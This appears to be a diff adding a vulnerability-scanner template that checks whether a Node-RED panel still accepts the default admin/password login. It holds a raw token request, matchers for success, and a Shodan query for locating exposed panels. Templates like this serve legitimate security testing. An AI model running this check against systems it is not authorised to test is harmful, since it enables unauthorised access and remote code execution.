@@ -1,0 +1,51 @@
+id: nodered-default-login
+
+info:
+  name: Node-Red - Default Login
+  author: savik
+  severity: critical
+  description: |
+   Allows attacker to log in and execute RCE on the Node-Red panel using the default credentials.
+  reference:
+    - https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/
+  metadata:
+    max-request: 1
+    verified: true
+    shodan-query: http.favicon.hash:321591353
+  tags: default-login,node-red,dashboard
+
+http:
+  - raw:
+      - |
+        POST /auth/token HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+
+        client_id=node-red-editor&grant_type=password&scope=&username={{username}}&password={{password}}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+      password:
+        - password
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'access_token":'
+          - 'expires_in":'
+          - 'token_type":'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - 'application/json'
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a0047304502202c34efe7b91a3a42211b376d2f69c5ff7ca117baff0a005dc2e424d0ea7a4c2202210091f0e6cb41aeaab2715fad0c2de1192334b014ff970921d23e20f2b6e01edae7:922c64590222798bb761d5b6d8e72950
